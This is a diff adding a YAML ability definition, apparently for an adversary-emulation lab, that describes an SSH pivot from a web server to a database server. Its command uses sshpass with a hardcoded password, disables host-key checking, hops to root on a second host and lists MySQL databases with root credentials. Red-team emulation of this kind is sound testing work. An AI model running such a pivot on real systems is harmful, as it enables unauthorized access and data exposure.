@@ -1,0 +1,15 @@
+- id: lm01-ssh-pivot
+  name: SSH Pivot to DB Server
+  description: Pivot from web-server-1 to db-server-1 using stolen credentials
+  tactic: lateral-movement
+  technique:
+    attack_id: T1021.004
+    name: Remote Services - SSH
+  platforms:
+    linux:
+      sh:
+        command: |
+          sshpass -p 'toor' ssh -o StrictHostKeyChecking=no labuser@10.0.20.21 "ssh -o StrictHostKeyChecking=no root@10.0.20.30 'id; hostname; mysql -u root -proot -e \"SHOW DATABASES;\"'" 2>/dev/null || echo 'SSH pivot attempted'
+
+  singleton: false
+  repeatable: false
